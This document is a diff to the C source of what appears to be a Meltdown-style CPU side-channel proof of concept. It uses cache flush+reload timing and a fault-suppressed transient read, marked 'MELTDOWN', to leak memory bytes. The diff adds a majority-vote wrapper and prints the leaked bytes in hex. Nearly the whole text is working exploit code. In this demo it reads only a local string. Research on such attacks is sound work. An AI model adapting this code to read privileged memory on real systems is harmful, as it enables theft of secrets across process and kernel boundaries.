@@ -20,19 +20,19 @@ static inline void flush(void* p) {
 static inline void maccess(void* p) {
 	*(volatile size_t*)p;
 }
-static uint64_t rdtsc() {
-	uint64_t volatile a = 0, d = 0;
-	__asm {
-
-		RDTSCP
-		MOV DWORD PTR[d], EDX
-		MOV DWORD PTR[a], EAX
-
-	}
-	a = (d << 32) | a;
-	return a;
-}
-static inline uint64_t xxx_dtsc() {
+//static uint64_t rdtsc() {
+//	uint64_t volatile a = 0, d = 0;
+//	__asm {
+//
+//		RDTSCP
+//		MOV DWORD PTR[d], EDX
+//		MOV DWORD PTR[a], EAX
+//
+//	}
+//	a = (d << 32) | a;
+//	return a;
+//}
+static inline uint64_t rdtsc() {
 	uint64_t a;
 
 	_mm_mfence();
@@ -41,13 +41,13 @@ static inline uint64_t xxx_dtsc() {
 
 	return a;
 }
-int add(int a, int b)
-{
-	__asm {
-		mov eax, DWORD PTR[a]
-		add eax, dword ptr b
-	}
-}
+//int add(int a, int b)
+//{
+//	__asm {
+//		mov eax, DWORD PTR[a]
+//		add eax, dword ptr b
+//	}
+//}
 static int flush_reload(void* ptr) {
 	uint64_t volatile start = 0, end = 0;
 
@@ -62,9 +62,31 @@ static int flush_reload(void* ptr) {
 	}
 	return 0;
 }
-
-int read_buf(size_t addr) {
+int packed_read(size_t addr) {
 	phys = addr;
+
+	char res_stat[256];
+	int i, j, r;
+	for (i = 0; i < 256; i++)
+		res_stat[i] = 0;
+
+
+	for (i = 0; i < 3; i++) {
+		r = read_buf();
+		res_stat[r]++;
+	}
+	int max_v = 0, max_i = 0;
+
+	for (i = 1; i < 256; i++) {
+		if (res_stat[i] > max_v && res_stat[i] >= 1) {
+			max_v = res_stat[i];
+			max_i = i;
+		}
+	}
+	return max_i;
+}
+int read_buf() {
+	//phys = addr;
 
 	size_t retries = 10000 + 1;
 	uint64_t start = 0, end = 0;
@@ -72,18 +94,23 @@ int read_buf(size_t addr) {
 
 
 	while (retries--) {
-		if (1) {
-			uint64_t byte;
 
+	
+		__try {
+			//MELTDOWN
+			uint64_t volatile  byte;
 		retry:
 			byte = *(volatile uint8_t*)phys;
 			byte <<= 12;
-			if (byte == 0) goto retry;
+			//if (byte == 0) goto retry;
 
 			*(volatile uint64_t*)(mem + byte);
+			//END MELTDOWN;
 		}
-
-		int i;
+		__except (1) {
+	
+		}
+		int volatile i;
 		for (i = 0; i < 256; i++) {
 			if (flush_reload(mem + i * 4096)) {
 				if (i >= 1) {
@@ -91,8 +118,9 @@ int read_buf(size_t addr) {
 				}
 			}
 		}
+
 	}
-	return 'X';
+	return 0;
 
 }
 
@@ -131,6 +159,8 @@ static void detect_flush_reload_threshold() {
 
 int main() {
 
+	int aX = 2;
+
 	_mem = malloc(4096 * 256);
 
 	mem = (char*)(((size_t)_mem  ) );
@@ -146,9 +176,8 @@ int main() {
 	int a = 5;
 	int b = 4;
 
-	int result = 0;
+	int result = 2;
 	int index=0;
-	result = add(a , b);
 	printf("Test number is: %i \n", result);
 
 	int xretval;
@@ -164,10 +193,11 @@ int main() {
 	char value='X';
 	while (index <=strlen(strings)) {
 
-		value = read_buf((strings+index));
-		printf("%c", value);
+		value = packed_read((strings + index));
+		printf("%X ", value);
 		fflush(stdout);
 		index++;
 	}
+	system("pause");
 	return 0;
 }
